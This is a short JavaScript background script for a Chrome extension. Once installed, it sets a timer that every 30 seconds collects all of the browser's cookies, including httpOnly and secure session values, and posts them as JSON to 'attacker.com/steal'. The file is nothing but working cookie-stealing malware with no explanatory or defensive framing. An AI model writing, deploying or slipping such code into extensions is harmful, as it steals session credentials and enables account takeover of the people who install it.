chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("exfiltrateCookies", { periodInMinutes: 0.5});
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "exfiltrateCookies") {
    chrome.cookies.getAll({}, (cookies) => {
      const data = cookies.map(cookie => ({
        domain: cookie.domain,
        name: cookie.name,
        value: cookie.value,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite
      }));

      fetch("http://attacker.com/steal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(response => {
        console.log("Fetch response status:", response.status);
        return response.text();
      })
      .then(text => {
        console.log("Fetch response body:", text);
      })
      .catch(error => {
        console.error("Fetch error:", error);
      });
    });
  }
});
